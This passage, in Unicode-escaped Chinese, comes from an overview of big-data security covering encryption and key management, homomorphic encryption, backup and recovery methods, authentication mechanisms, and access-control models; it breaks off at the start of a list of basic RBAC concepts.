\u6839\u636e\u6570\u636e\u654f\u611f\u6027\uff0c\u5bf9\u6570\u636e\u8fdb\u884c\u6709\u9009\u62e9\u7684\u52a0\u5bc6\uff0c\u4ec5\u5bf9\u654f\u611f\u6570\u636e\u8fdb\u884c\u6309\u9700\u52a0\u5bc6\u5b58\u50a8\uff0c\u800c\u514d\u9664\u5bf9\u4e0d\u654f\u611f\u6570\u636e\u7684\u52a0\u5bc6\uff0c\u53ef\u4ee5\u51cf\u5c0f\u52a0\u5bc6\u5b58\u50a8\u5bf9\u7cfb\u7edf\u6027\u80fd\u9020\u6210\u7684\u635f\u5931\uff0c\u5bf9\u7ef4\u6301\u7cfb\u7edf\u7684\u9ad8\u6027\u80fd\u6709\u7740\u79ef\u6781\u7684\u610f\u4e49\u3002 02.02.01.03 \u5bc6\u94a5\u7ba1\u7406\u65b9\u6848 \u5bc6\u94a5\u7ba1\u7406\u65b9\u6848\u4e3b\u8981\u5305\u62ec\uff1a\u5bc6\u94a5\u7c92\u5ea6\u7684\u9009\u62e9\u3001\u5bc6\u94a5\u7ba1\u7406\u4f53\u7cfb\u4ee5\u53ca\u5bc6\u94a5\u5206\u53d1\u673a\u5236\u3002\u5bc6\u94a5\u662f\u6570\u636e\u52a0\u5bc6\u4e0d\u53ef\u6216\u7f3a\u7684\u90e8\u5206\uff0c\u5bc6\u94a5\u6570\u636e\u7684\u591a\u5c11\u4e0e\u5bc6\u94a5\u7684\u7c92\u5ea6\u76f4\u63a5\u76f8\u5173\u3002\u5bc6\u94a5\u7c92\u5ea6\u8f83\u5927\u65f6\uff0c\u65b9\u4fbf\u7528\u6237\u7ba1\u7406\uff0c\u4f46\u4e0d\u9002\u5408\u4e8e\u7ec6\u7c92\u5ea6\u7684\u8bbf\u95ee\u63a7\u5236\u3002\u5bc6\u94a5\u7c92\u5ea6\u5c0f\u65f6\uff0c\u53ef\u5b9e\u73b0\u7ec6\u7c92\u5ea6\u7684\u63a7\u5236\uff0c\u5b89\u5168\u6027\u66f4\u9ad8\uff0c\u4f46\u4ea7\u751f\u7684\u5bc6\u94a5\u6570\u91cf\u5927\u96be\u4e8e\u7ba1\u7406\u3002 \u9002\u5408\u5927\u6570\u636e\u5b58\u50a8\u7684\u5bc6\u94a5\u7ba1\u7406\u529e\u6cd5\u4e3b\u8981\u662f\u5206\u5c42\u5bc6\u94a5\u7ba1\u7406\uff0c\u5373\"\u91d1\u5b57\u5854\"\u5f0f\u5bc6\u94a5\u7ba1\u7406\u4f53\u7cfb\u3002\u8fd9\u79cd\u5bc6\u94a5\u7ba1\u7406\u4f53\u7cfb\u5c31\u662f\u5c06\u5bc6\u94a5\u4ee5\u91d1\u5b57\u5854\u7684\u65b9\u5f0f\u5b58\u653e\uff0c\u4e0a\u5c42\u5bc6\u94a5\u7528\u6765\u52a0/\u89e3\u5bc6\u4e0b\u5c42\u5bc6\u94a5\uff0c\u53ea\u9700\u5c06\u9876\u5c42\u5bc6\u94a5\u5206\u53d1\u7ed9\u6570\u636e\u8282\u70b9\uff0c\u5176\u4ed6\u5c42\u5bc6\u94a5\u5747\u53ef\u76f4\u63a5\u5b58\u653e\u4e8e\u7cfb\u7edf\u4e2d\u3002\u8003\u8651\u5230\u5b89\u5168\u6027\uff0c\u5927\u6570\u636e\u5b58\u50a8\u7cfb\u7edf\u9700\u8981\u91c7\u7528\u4e2d\u7b49\u6216\u7ec6\u7c92\u5ea6\u7684\u5bc6\u94a5\uff0c\u56e0\u6b64\u5bc6\u94a5\u6570\u91cf\u591a\uff0c\u800c\u91c7\u7528\u5206\u5c42\u5bc6\u94a5\u7ba1\u7406\u65f6\uff0c\u6570\u636e\u8282\u70b9\u53ea\u9700\u4fdd\u7ba1\u5c11\u6570\u5bc6\u94a5\u5c31\u53ef\u5bf9\u5927\u91cf\u5bc6\u94a5\u52a0\u4ee5\u7ba1\u7406\uff0c\u6548\u7387\u66f4\u9ad8\u3002 \u53ef\u4ee5\u4f7f\u7528\u57fa\u4e8ePKI\u4f53\u7cfb\u7684\u5bc6\u94a5\u5206\u53d1\u65b9\u5f0f\u5bf9\u9876\u5c42\u5bc6\u94a5\u8fdb\u884c\u5206\u53d1\uff0c\u7528\u6bcf\u4e2a\u6570\u636e\u8282\u70b9\u7684\u516c\u94a5\u52a0\u5bc6\u5bf9\u79f0\u5bc6\u94a5\uff0c\u53d1\u9001\u7ed9\u76f8\u5e94\u7684\u6570\u636e\u8282\u70b9\uff0c\u6570\u636e\u8282\u70b9\u63a5\u6536\u5230\u5bc6\u6587\u7684\u5bc6\u94a5\u540e\uff0c\u4f7f\u7528\u79c1\u94a5\u89e3\u5bc6\u83b7\u5f97\u5bc6\u94a5\u660e\u6587\u3002 02.02.02 \u52a8\u6001\u6570\u636e\u52a0\u5bc6\u673a\u5236 \u540c\u6001\u52a0\u5bc6\u662f\u57fa\u4e8e\u6570\u5b66\u96be\u9898\u7684\u8ba1\u7b97\u590d\u6742\u6027\u7406\u8bba\u7684\u5bc6\u7801\u5b66\u6280\u672f\u3002\u5bf9\u7ecf\u8fc7\u540c\u6001\u52a0\u5bc6\u7684\u6570\u636e\u8fdb\u884c\u5904\u7406\u7684\u5f97\u5230\u4e00\u4e2a\u8f93\u51fa\uff0c\u5c06\u8fd9\u4e00\u8f93\u51fa\u8fdb\u884c\u89e3\u5bc6\uff0c\u5176\u7ed3\u679c\u4e0e\u7528\u7edf\u4e00\u65b9\u6cd5\u5904\u7406\u672a\u52a0\u5bc6\u7684\u539f\u59cb\u6570\u636e\u5f97\u5230\u7684\u8f93\u51fa\u7ed3\u679c\u662f\u4e00\u6837\u7684\u3002\u8bb0\u5f55\u52a0\u5bc6\u64cd\u4f5c\u4e3aE\uff0c\u660e\u6587\u4e3am\uff0c\u52a0\u5bc6\u5f97e\uff0c\u5373e=E(m)\uff0cm=E'(e)\u3002\u5df2\u77e5\u9488\u5bf9\u660e\u6587\u6709\u64cd\u4f5cf\uff0c\u9488\u5bf9E\u53ef\u4ee5\u6784\u9020F\uff0c\u4f7f\u5f97F(e)=E(f(m))\uff0c\u8fd9\u6837E\u5c31\u662f\u4e00\u4e2a\u9488\u5bf9f\u7684\u540c\u6001\u52a0\u5bc6\u7b97\u6cd5\u3002 \u540c\u6001\u52a0\u5bc6\u6280\u672f\u662f\u5bc6\u7801\u5b66\u9886\u57df\u7684\u4e00\u4e2a\u91cd\u8981\u8bfe\u9898\uff0c\u76ee\u524d\u5c1a\u6ca1\u6709\u771f\u6b63\u53ef\u7528\u4e8e\u5b9e\u9645\u7684\u5168\u540c\u6001\u52a0\u5bc6\u7b97\u6cd5\uff0c\u540c\u6001\u6280\u672f\u4f7f\u5f97\u5728\u52a0\u5bc6\u7684\u6570\u636e\u4e2d\u8fdb\u884c\u8bf8\u5982\u68c0\u7d22\u3001\u6bd4\u8f83\u7b49\u64cd\u4f5c\uff0c\u5f97\u51fa\u6b63\u786e\u7684\u7ed3\u679c\uff0c\u800c\u5728\u6574\u4e2a\u5904\u7406\u8fc7\u7a0b\u4e2d\u65e0\u9700\u5bf9\u6570\u636e\u8fdb\u884c\u89e3\u5bc6\u3002\u5176\u610f\u4e49\u5728\u4e8e\uff0c\u771f\u6b63\u4ece\u6839\u672c\u4e0a\u89e3\u51b3\u5c06\u5927\u6570\u636e\u673a\u5668\u64cd\u4f5c\u7684\u4fdd\u5bc6\u95ee\u9898\u3002 02.03 \u5907\u4efd\u4e0e\u6062\u590d \u6570\u636e\u5b58\u50a8\u7cfb\u7edf\u5e94\u63d0\u4f9b\u5b8c\u5907\u7684\u6570\u636e\u5907\u4efd\u548c\u6062\u590d\u673a\u5236\u6765\u4fdd\u969c\u6570\u636e\u7684\u53ef\u7528\u6027\u548c\u5b8c\u6574\u6027\uff0c\u4e00\u65e6\u53d1\u751f\u6570\u636e\u4e22\u5931\u6216\u7834\u574f\uff0c\u53ef\u4ee5\u5229\u7528\u5907\u4efd\u6765\u6062\u590d\u6570\u636e\uff0c\u4ece\u800c\u4fdd\u8bc1\u5728\u6545\u969c\u53d1\u751f\u540e\u6570\u636e\u4e0d\u4e22\u5931\u3002 \u4e0b\u9762\u662f\u51e0\u79cd\u5e38\u89c1\u7684\u5907\u4efd\u4e0e\u6062\u590d\u673a\u5236\uff1a 02.03.01 \u5f02\u5730\u5907\u4efd \u5f02\u5730\u5907\u4efd\u662f\u4fdd\u62a4\u6570\u636e\u6700\u5b89\u5168\u7684\u65b9\u5f0f\u3002\u5728\u53d1\u751f\u706b\u707e\u3001\u5730\u9707\u7b49\u91cd\u5927\u707e\u96be\u7684\u60c5\u51b5\uff0c\u5728\u5176\u4ed6\u4fdd\u62a4\u6570\u636e\u7684\u624b\u6bb5\u90fd\u4e0d\u8d77\u4f5c\u7528\u65f6\uff0c\u5f02\u5730\u5bb9\u707e\u7684\u4f18\u52bf\u5c31\u4f53\u73b0\u51fa\u6765\u4e86\u3002\u56f0\u6270\u5f02\u5730\u5bb9\u707e\u7684\u95ee\u9898\u5728\u4e8e\u901f\u5ea6\u548c\u6210\u672c\uff0c\u8fd9\u8981\u6c42\u62e5\u6709\u8db3\u591f\u5e26\u5bbd\u7684\u7f51\u7edc\u8fde\u63a5\u548c\u4f18\u79c0\u7684\u6570\u636e\u590d\u5236\u7ba1\u7406\u8f6f\u4ef6\u3002 02.03.02 RAID RAID\uff08\u72ec\u7acb\u78c1\u76d8\u5197\u4f59\u9635\u5217\uff09\u53ef\u4ee5\u51cf\u5c11\u78c1\u76d8\u90e8\u4ef6\u7684\u635f\u574f\uff1bRAID\u7cfb\u7edf\u4f7f\u7528\u8bb8\u591a\u5c0f\u5bb9\u91cf\u78c1\u76d8\u9a71\u52a8\u5668\u6765\u5b58\u50a8\u5927\u91cf\u6570\u636e\uff0c\u5e76\u4e14\u4f7f\u53ef\u9760\u6027\u548c\u5197\u4f59\u6027\u5f97\u5230\u589e\u5f3a\uff1b\u6240\u6709\u7684RAID\u7cfb\u7edf\u5171\u540c\u7684\u7279\u70b9\u662f\"\u70ed\u4ea4\u6362\"\u80fd\u529b\uff0c\u5373\u7528\u6237\u53ef\u4ee5\u53d6\u51fa\u4e00\u4e2a\u5b58\u5728\u7f3a\u9677\u7684\u9a71\u52a8\u5668\uff0c\u5e76\u63d2\u5165\u4e00\u4e2a\u65b0\u7684\u4e88\u4ee5\u66f4\u6362\u3002\u5bf9\u5927\u591a\u6570\u7c7b\u578b\u7684RAID\u6765\u8bf4\uff0c\u4e0d\u5fc5\u4e2d\u65ad\u670d\u52a1\u5668\u6216\u7cfb\u7edf\uff0c\u5c31\u53ef\u4ee5\u81ea\u52a8\u91cd\u5efa\u67d0\u4e2a\u51fa\u73b0\u6545\u969c\u78c1\u76d8\u4e0a\u7684\u6570\u636e\u3002 02.03.03 \u6570\u636e\u955c\u50cf \u6570\u636e\u955c\u50cf\u5c31\u662f\u4fdd\u7559\u4e24\u4e2a\u6216\u4e24\u4e2a\u4ee5\u4e0a\u5728\u7ebf\u6570\u636e\u7684\u62f7\u8d1d\u3002\u4ee5\u4e24\u4e2a\u955c\u50cf\u78c1\u76d8\u4e3a\u4f8b\uff0c\u6240\u6709\u5199\u64cd\u4f5c\u5728\u4e24\u4e2a\u72ec\u7acb\u7684\u78c1\u76d8\u4e0a\u540c\u65f6\u8fdb\u884c\uff1b\u5f53\u4e24\u4e2a\u78c1\u76d8\u90fd\u6b63\u5e38\u5de5\u4f5c\u65f6\uff0c\u6570\u636e\u53ef\u4ee5\u4ece\u4efb\u4e00\u78c1\u76d8\u8bfb\u53d6\uff1b\u5982\u679c\u4e00\u4e2a\u78c1\u76d8\u5931\u6548\uff0c\u5219\u6570\u636e\u8fd8\u53ef\u4ee5\u4ece\u53e6\u5916\u4e00\u4e2a\u6b63\u5e38\u5de5\u4f5c\u7684\u78c1\u76d8\u8bfb\u51fa\u3002\u8fdc\u7a0b\u955c\u50cf\u6839\u636e\u91c7\u7528\u7684\u5199\u534f\u8bae\u4e0d\u540c\u53ef\u5212\u5206\u4e3a\u4e24\u79cd\u65b9\u5f0f\uff0c\u5373\u540c\u6b65\u955c\u50cf\u548c\u5f02\u6b65\u955c\u50cf\u3002\u672c\u5730\u793e\u4fdd\u9047\u5230\u4e0d\u53ef\u6062\u590d\u7684\u786c\u4ef6\u635f\u574f\u65f6\uff0c\u4ecd\u53ef\u4ee5\u542f\u52a8\u5f02\u5730\u4e0e\u6b64\u76f8\u540c\u73af\u5883\u548c\u5185\u5bb9\u7684\u955c\u50cf\u8bbe\u5907\uff0c\u4ee5\u4fdd\u969c\u670d\u52a1\u4e0d\u95f4\u65ad\u3002 02.03.04 \u5feb\u7167 \u5feb\u7167\u53ef\u4ee5\u662f\u5176\u6240\u8868\u793a\u6570\u636e\u7684\u4e00\u4e2a\u526f\u672c\uff0c\u4e5f\u53ef\u4ee5\u662f\u6570\u636e\u7684\u4e00\u4e2a\u590d\u5236\u54c1\u3002\u5feb\u7167\u53ef\u4ee5\u8fc5\u901f\u6062\u590d\u906d\u7834\u574f\u7684\u6570\u636e\u3002\u5feb\u7167\u7684\u4f5c\u7528\u4e3b\u8981\u662f\u80fd\u591f\u8fdb\u884c\u5728\u7ebf\u6570\u636e\u5907\u4efd\u4e0e\u6062\u590d\u3002\u5f53\u5b58\u50a8\u8bbe\u5907\u53d1\u751f\u5e94\u7528\u6545\u969c\u6216\u8005\u6587\u4ef6\u635f\u574f\u65f6\u53ef\u4ee5\u8fdb\u884c\u5feb\u901f\u7684\u6570\u636e\u6062\u590d\uff0c\u5c06\u6570\u636e\u6062\u590d\u67d0\u4e2a\u53ef\u7528\u65f6\u95f4\u70b9\u7684\u72b6\u6001\u3002 \u6570\u636e\u91cf\u6bd4\u8f83\u5c0f\u7684\u65f6\u5019\uff0c\u5907\u4efd\u548c\u6062\u590d\u6570\u636e\u6bd4\u8f83\u7b80\u5355\uff0c\u968f\u7740\u6570\u636e\u91cf\u8fbe\u5230PB\u7ea7\u522b\uff0c\u5907\u4efd\u548c\u6062\u590d\u5982\u6b64\u5e9e\u5927\u7684\u6570\u636e\u6210\u4e3a\u68d8\u624b\u7684\u95ee\u9898\u3002\u76ee\u524dHadoop\u662f\u5e94\u7528\u6700\u5e7f\u6cdb\u7684\u5927\u6570\u636e\u8f6f\u4ef6\u67b6\u6784\uff0cHadoop\u5206\u5e03\u5f0f\u6587\u4ef6\u7cfb\u7edfHDFS\u53ef\u4ee5\u5229\u7528\u5176\u81ea\u8eab\u7684\u6570\u636e\u5907\u4efd\u548c\u6062\u590d\u673a\u5236\u6765\u5b9e\u73b0\u6570\u636e\u53ef\u9760\u4fdd\u62a4\u3002 \u5927\u6570\u636e\u73af\u5883\u4e0b\uff0c\u6570\u636e\u7684\u5b58\u50a8\u4e00\u822c\u90fd\u4f7f\u7528HDFS\u81ea\u8eab\u7684\u5907\u4efd\u4e0e\u6062\u590d\u673a\u5236\uff0c\u4f46\u5bf9\u4e8e\u6838\u5fc3\u7684\u6570\u636e\uff0c\u8fdc\u7a0b\u7684\u5bb9\u707e\u5907\u4efd\u4ecd\u7136\u662f\u5fc5\u987b\u7684\u3002\u5176\u4ed6\u989d\u5916\u7684\u6570\u636e\u5907\u4efd\u548c\u6062\u590d\u7b56\u7565\u9700\u8981\u6839\u636e\u5b9e\u9645\u9700\u6c42\u6765\u5236\u5b9a\u3002 03 \u6570\u636e\u6316\u6398\u5b89\u5168\u6280\u672f 03.01 \u8eab\u4efd\u8ba4\u8bc1 \u8eab\u4efd\u8ba4\u8bc1\uff1a\u8ba1\u7b97\u673a\u53ca\u7f51\u7edc\u7cfb\u7edf\u786e\u8ba4\u64cd\u4f5c\u8005\u8eab\u4efd\u7b49\u8fc7\u7a0b\u3002\u4e5f\u5c31\u662f\u8bc1\u5b9e\u7528\u6237\u7b49\u771f\u5b9e\u8eab\u4efd\u4e0e\u5176\u6240\u58f0\u79f0\u7684\u8eab\u4efd\u662f\u5426\u7b26\u5408\u7b49\u8fc7\u7a0b\u3002 \u8eab\u4efd\u8ba4\u8bc1\u6280\u672f\u5206\u4e3a\uff1a \u57fa\u4e8e\u79d8\u5bc6\u4fe1\u606f\u7b49\u8eab\u4efd\u8ba4\u8bc1\u6280\u672f \u57fa\u4e8e\u4fe1\u7269\u7684\u8eab\u4efd\u8ba4\u8bc1\u6280\u672f \u57fa\u4e8e\u751f\u7269\u7279\u5f81\u7684\u8eab\u4efd\u8ba4\u8bc1\u6280\u672f \u5e38\u89c1\u7b49\u8ba4\u8bc1\u673a\u5236\u6709\u5982\u4e0b\uff1a Kerberos\u8ba4\u8bc1 \u57fa\u4e8e\u516c\u94a5\u7684\u8ba4\u8bc1\u673a\u5236\uff08PKI\uff09 \u57fa\u4e8e\u52a8\u6001\u53e3\u4ee4\u7684\u8ba4\u8bc1\u673a\u5236 \u57fa\u4e8e\u751f\u7269\u8bc6\u522b\u6280\u672f\u7b49\u8ba4\u8bc1\u6280\u672f Kerberos\u8ba4\u8bc1\u662f\u57fa\u4e8e\u5bf9\u79f0\u5bc6\u7801\u673a\u5236\u7684\uff0c\u8fd0\u7b97\u6548\u7387\u9ad8\uff0c\u56e0\u6b64\u5bf9\u4e8e\u53ea\u8981\u6c42\u6570\u636e\u673a\u5bc6\u6027\uff0c\u4e0d\u9700\u8981\u5b8c\u6574\u6027\u548c\u4e0d\u53ef\u5426\u8ba4\u6027\u9700\u6c42\u7684\u573a\u5408\uff0c\u53ef\u4f7f\u7528Kerberos\u8ba4\u8bc1\u3002 \u57fa\u4e8ePKI\u7684\u8eab\u4efd\u8ba4\u8bc1\u673a\u5236\u76f8\u5bf9\u5b8c\u5584\u590d\u6742\uff0c\u56e0\u6b64\uff0c\u5bf9\u4e8e\u65e2\u8981\u6c42\u6570\u636e\u673a\u5bc6\u6027\uff0c\u53c8\u8981\u6c42\u5b8c\u6574\u6027\u548c\u4e0d\u53ef\u5426\u8ba4\u6027\u7684\u573a\u5408\uff0c\u9700\u8981\u91c7\u7528\u57fa\u4e8ePKI\u4f53\u7cfb\u7684\u8ba4\u8bc1\u673a\u5236\u6765\u8fdb\u884c\u7528\u6237\u8eab\u4efd\u8ba4\u8bc1\u3002 \u968f\u7740\u8eab\u4efd\u7ba1\u7406\u6280\u672f\u7684\u53d1\u5c55\uff0c\u878d\u5408\u751f\u7269\u8bc6\u522b\u6280\u672f\u7684\u5f3a\u7528\u6237\u8ba4\u8bc1\u548c\u57fa\u4e8eWeb\u5e94\u7528\u7684\u5355\u70b9\u767b\u5f55\u6280\u672f\u88ab\u5e7f\u6cdb\u7684\u5e94\u7528\u3002\u57fa\u4e8e\u7528\u6237\u7684\u751f\u7269\u7279\u5f81\u8eab\u4efd\u8ba4\u8bc1\u6bd4\u4f20\u7edf\u8f93\u5165\u7528\u6237\u540d\u548c\u5bc6\u7801\u7684\u65b9\u5f0f\u66f4\u5b89\u5168\u3002\u7528\u6237\u53ef\u4ee5\u5229\u7528\u7ec8\u7aef\u914d\u5907\u4e2d\u7684\u751f\u7269\u7279\u5f81\u91c7\u96c6\u8bbe\u5907\uff08\u5982\uff1a\u6444\u50cf\u5934\u3001MIC\u3001\u6307\u7eb9\u626b\u63cf\u5668\u7b49\uff09\u8f93\u5165\u81ea\u8eab\u5177\u6709\u552f\u4e00\u6027\u7684\u751f\u7269\u7279\u5f81\uff08\u5982\uff1a\u4eba\u8138\u56fe\u50cf\u3001\u638c\u7eb9\u56fe\u50cf\u3001\u6307\u7eb9\u548c\u58f0\u7eb9\u7b49\uff09\u8fdb\u884c\u7528\u6237\u767b\u5f55\u3002\u591a\u56e0\u7d20\u8ba4\u8bc1\u5219\u5c06\u751f\u7269\u8ba4\u8bc1\u4e0e\u5bc6\u7801\u6280\u672f\u76f8\u7ed3\u5408\uff0c\u63d0\u4f9b\u7ed9\u7528\u6237\u66f4\u9ad8\u5b89\u5168\u6027\u7684\u7528\u6237\u767b\u5f55\u670d\u52a1\u3002 03.01.01 \u57fa\u4e8e\u52a8\u6001\u53e3\u4ee4\u7684\u8ba4\u8bc1\u673a\u5236 \u52a8\u6001\u53e3\u4ee4\u673a\u5236\u662f\u4e3a\u4e86\u89e3\u51b3\u9759\u6001\u53e3\u4ee4\u7b49\u4e0d\u5b89\u5168\u95ee\u9898\u800c\u63d0\u51fa\u7684\uff0c\u57fa\u672c\u601d\u60f3\u662f\u7528\u52a8\u6001\u53e3\u4ee4\u4ee3\u66ff\u9759\u6001\u53e3\u4ee4\uff0c\u5176\u57fa\u672c\u539f\u7406\u662f\uff1a\u5728\u5ba2\u6237\u7aef\u767b\u5f55\u8fc7\u7a0b\u4e2d\uff0c\u57fa\u4e8e\u7528\u6237\u7b49\u79d8\u5bc6\u901a\u884c\u77ed\u8bed\uff08SPP\uff0cSecure Pass Phrase\uff09\u52a0\u5165\u4e0d\u786e\u5b9a\u56e0\u7d20\uff0cSSP\u548c\u4e0d\u786e\u5b9a\u56e0\u7d20\u8fdb\u884c\u4ea4\u6362\uff08\u5982\uff1a\u4f7f\u7528md5\u6d88\u606f\u6458\u8981\uff09\uff0c\u6240\u5f97\u7684\u7ed3\u679c\u4f5c\u4e3a\u8ba4\u8bc1\u6570\u636e\uff08\u5373\u52a8\u6001\u53e3\u4ee4\uff09\u63d0\u4ea4\u7ed9\u8ba4\u8bc1\u670d\u52a1\u5668\u3002\u7531\u4e8e\u5ba2\u6237\u7aef\u6bcf\u6b21\u8ba4\u8bc1\u6570\u636e\u90fd\u91c7\u7528\u4e0d\u540c\u7684\u4e0d\u786e\u5b9a\u56e0\u7d20\u503c\uff0c\u4fdd\u8bc1\u4e86\u5ba2\u6237\u7aef\u6bcf\u6b21\u63d0\u4ea4\u7684\u8ba4\u8bc1\u6570\u636e\u90fd\u4e0d\u76f8\u540c\uff0c\u56e0\u6b64\u52a8\u6001\u53e3\u4ee4\u673a\u5236\u6709\u6548\u5730\u63d0\u9ad8\u4e86\u8eab\u4efd\u8ba4\u8bc1\u7684\u5b89\u5168\u6027\u3002 03.02 \u8bbf\u95ee\u63a7\u5236 \u8bbf\u95ee\u63a7\u5236\u662f\u6307\u4e3b\u4f53\u6839\u636e\u67d0\u4e9b\u63a7\u5236\u7b56\u7565\u6216\u6743\u9650\u5bf9\u5ba2\u4f53\u6216\u5176\u8d44\u6e90\u8fdb\u884c\u7684\u4e0d\u540c\u6388\u6743\u8bbf\u95ee\uff0c\u9650\u5236\u5bf9\u5173\u952e\u8d44\u6e90\u7684\u8bbf\u95ee\uff0c\u9632\u6b62\u975e\u6cd5\u7528\u6237\u8fdb\u5165\u7cfb\u7edf\u53ca\u5408\u6cd5\u7528\u6237\u5bf9\u8d44\u6e90\u7684\u975e\u6cd5\u4f7f\u7528\u3002\u8bbf\u95ee\u63a7\u5236\u662f\u8fdb\u884c\u6570\u636e\u5b89\u5168\u4fdd\u62a4\u7684\u6838\u5fc3\u7b56\u7565\uff0c\u4e3a\u6709\u6548\u63a7\u5236\u7528\u6237\u8bbf\u95ee\u6570\u636e\u5b58\u50a8\u7cfb\u7edf\uff0c\u4fdd\u8bc1\u6570\u636e\u8d44\u6e90\u7684\u5b89\u5168\uff0c\u53ef\u6388\u4e88\u6bcf\u4e2a\u7cfb\u7edf\u8bbf\u95ee\u8005\u4e0d\u540c\u7684\u8bbf\u95ee\u7ea7\u522b\uff0c\u5e76\u8bbe\u7f6e\u76f8\u5e94\u7684\u7b56\u7565\u4fdd\u8bc1\u5408\u6cd5\u7528\u6237\u83b7\u5f97\u6570\u636e\u7684\u8bbf\u95ee\u6743\u3002\u8bbf\u95ee\u63a7\u5236\u4e00\u822c\u53ef\u4ee5\u662f\u81ea\u4e3b\u6216\u8005\u975e\u81ea\u4e3b\u7684\uff0c\u6700\u5e38\u89c1\u7684\u8bbf\u95ee\u63a7\u5236\u6a21\u5f0f\u6709\u5982\u4e0b3\u79cd\uff1a 03.02.01 \u81ea\u4e3b\u8bbf\u95ee\u63a7\u5236 \u81ea\u4e3b\u8bbf\u95ee\u63a7\u5236\u662f\u6307\u5bf9\u67d0\u4e2a\u5ba2\u4f53\u5177\u6709\u62e5\u6709\u6743\uff08\u6216\u63a7\u5236\u6743\uff09\u7684\u4e3b\u4f53\u80fd\u591f\u5c06\u5bf9\u8be5\u5ba2\u4f53\u7684\u4e00\u79cd\u8bbf\u95ee\u6743\u6216\u591a\u79cd\u8bbf\u95ee\u6743\u81ea\u4e3b\u5730\u6388\u4e88\u5176\u5b83\u4e3b\u4f53\uff0c\u5e76\u5728\u968f\u540e\u7684\u4efb\u4f55\u65f6\u523b\u5c06\u8fd9\u4e9b\u6743\u9650\u56de\u6536\u3002\u8fd9\u79cd\u63a7\u5236\u662f\u81ea\u4e3b\u7684\uff0c\u4e5f\u5c31\u662f\u6307\u5177\u6709\u6388\u4e88\u67d0\u79cd\u8bbf\u95ee\u6743\u529b\u7684\u4e3b\u4f53\uff08\u7528\u6237\uff09\u80fd\u591f\u81ea\u5df1\u51b3\u5b9a\u662f\u5426\u5c06\u8bbf\u95ee\u63a7\u5236\u6743\u9650\u7b49\u67d0\u4e2a\u5b50\u96c6\u6388\u4e88\u5176\u4ed6\u7684\u4e3b\u4f53\u6216\u4ece\u5176\u4ed6\u4e3b\u4f53\u90a3\u91cc\u6536\u56de\u4ed6\u6240\u6388\u4e88\u7684\u8bbf\u95ee\u6743\u9650\u3002\u81ea\u4e3b\u8bbf\u95ee\u63a7\u5236\u4e2d\uff0c\u7528\u6237\u53ef\u4ee5\u9488\u5bf9\u88ab\u4fdd\u62a4\u5bf9\u8c61\u5236\u5b9a\u81ea\u5df1\u7684\u4fdd\u62a4\u7b56\u7565\u3002 03.02.02 \u5f3a\u5236\u8bbf\u95ee\u63a7\u5236 \u5f3a\u5236\u8bbf\u95ee\u63a7\u5236\u662f\u6307\u8ba1\u7b97\u673a\u7cfb\u7edf\u6839\u636e\u4f7f\u7528\u7cfb\u7edf\u7684\u673a\u6784\u4e8b\u5148\u786e\u5b9a\u7684\u5b89\u5168\u7b56\u7565\uff0c\u5bf9\u7528\u6237\u7684\u8bbf\u95ee\u6743\u9650\u8fdb\u884c\u5f3a\u5236\u6027\u7684\u63a7\u5236\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u7cfb\u7edf\u72ec\u7acb\u4e8e\u7528\u6237\u884c\u4e3a\u5f3a\u5236\u6267\u884c\u8bbf\u95ee\u63a7\u5236\uff0c\u7528\u6237\u4e0d\u80fd\u6539\u53d8\u4ed6\u4eec\u7684\u5b89\u5168\u7ea7\u522b\u6216\u5bf9\u8c61\u7684\u5b89\u5168\u5c5e\u6027\u3002\u5f3a\u5236\u8bbf\u95ee\u63a7\u5236\u8fdb\u884c\u4e86\u5f88\u5f3a\u7684\u7b49\u7ea7\u5212\u5206\uff0c\u6240\u4ee5\u7ecf\u5e38\u7528\u4e8e\u519b\u4e8b\u7528\u9014\u3002\u5f3a\u5236\u8bbf\u95ee\u63a7\u5236\u5728\u81ea\u4e3b\u8bbf\u95ee\u63a7\u5236\u7684\u57fa\u7840\u4e0a\uff0c\u589e\u52a0\u4e86\u5bf9\u7f51\u7edc\u8d44\u6e90\u7684\u5c5e\u6027\u5212\u5206\uff0c\u89c4\u5b9a\u4e0d\u540c\u5c5e\u6027\u4e0b\u7684\u8bbf\u95ee\u6743\u9650\u3002\u8fd9\u79cd\u673a\u5236\u7684\u4f18\u70b9\u662f\u5b89\u5168\u6027\u6bd4\u81ea\u4e3b\u8bbf\u95ee\u63a7\u5236\u7684\u5b89\u5168\u6027\u6709\u4e86\u63d0\u9ad8\uff0c\u7f3a\u70b9\u662f\u7075\u6d3b\u6027\u8981\u5dee\u4e00\u4e9b\u3002 03.02.03 \u57fa\u4e8e\u89d2\u8272\u7684\u8bbf\u95ee\u63a7\u5236 \u6570\u636e\u5e93\u7cfb\u7edf\u53ef\u4ee5\u91c7\u7528\u57fa\u4e8e\u89d2\u8272\u7684\u8bbf\u95ee\u63a7\u5236\u7b56\u7565\uff0c\u5efa\u7acb\u89d2\u8272\u3001\u6743\u9650\u4e0e\u8d26\u53f7\u7ba1\u7406\u673a\u5236\u3002\u57fa\u4e8e\u89d2\u8272\u7684\u8bbf\u95ee\u63a7\u5236\u65b9\u6cd5\u7684\u57fa\u672c\u601d\u60f3\u5728\u7528\u6237\u548c\u8bbf\u95ee\u6743\u9650\u4e4b\u95f4\u5f15\u5165\u89d2\u8272\u7684\u6982\u5ff5\uff0c\u5c06\u7528\u6237\u548c\u89d2\u8272\u8054\u7cfb\u8d77\u6765\uff0c\u901a\u8fc7\u5bf9\u89d2\u8272\u7684\u6388\u6743\u6765\u63a7\u5236\u7528\u6237\u5bf9\u7cfb\u7edf\u8d44\u6e90\u7684\u8bbf\u95ee\u3002\u8fd9\u79cd\u65b9\u6cd5\u53ef\u6839\u636e\u7528\u6237\u7684\u5de5\u4f5c\u804c\u8d23\u8bbe\u7f6e\u82e5\u5e72\u89d2\u8272\uff0c\u4e0d\u540c\u7684\u7528\u6237\u53ef\u4ee5\u5177\u6709\u76f8\u540c\u7684\u89d2\u8272\uff0c\u5728\u7cfb\u7edf\u4e2d\u4eab\u53d7\u76f8\u540c\u7684\u6743\u5229\uff0c\u540c\u4e00\u4e2a\u7528\u6237\u53c8\u53ef\u4ee5\u5177\u6709\u591a\u4e2a\u4e0d\u540c\u7684\u89d2\u8272\uff0c\u5728\u7cfb\u7edf\u4e2d\u884c\u4f7f\u591a\u4e2a\u89d2\u8272\u7684\u6743\u5229\u3002 RBAC\uff08Role-Based Access Control\uff09\u7684\u57fa\u672c\u6982\u5ff5\u5305\u62ec\uff1a 